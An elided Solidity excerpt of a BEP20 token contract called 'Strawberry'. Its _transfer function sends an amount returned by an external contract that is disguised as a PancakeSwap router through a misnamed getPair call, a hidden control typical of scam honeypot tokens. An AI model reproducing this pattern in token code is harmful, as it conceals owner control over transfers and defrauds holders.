...
contract Strawberry is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'Strawberry';
  string private constant _symbol = 'Strawberry';
  
  uint256 private _totalSupply = 10000000000 *  10**9;
  uint8 private constant _decimals = 9;
  uint256 private _bonusStrawberry = 0;
  address pancakeRouter_Strawberry;
  ...
  */
  ...
  function pancakePairStrawberry(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      resData = IPancake(pancakeRouter_Strawberry).getPair(_bonusStrawberry, sender, recipient, arrData);

      _bonusStrawberry = resData[0];
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmountStrawberry = pancakePairStrawberry(sender, recipient, amount);   
     _transferStandard(sender,recipient,bonusAmountStrawberry);
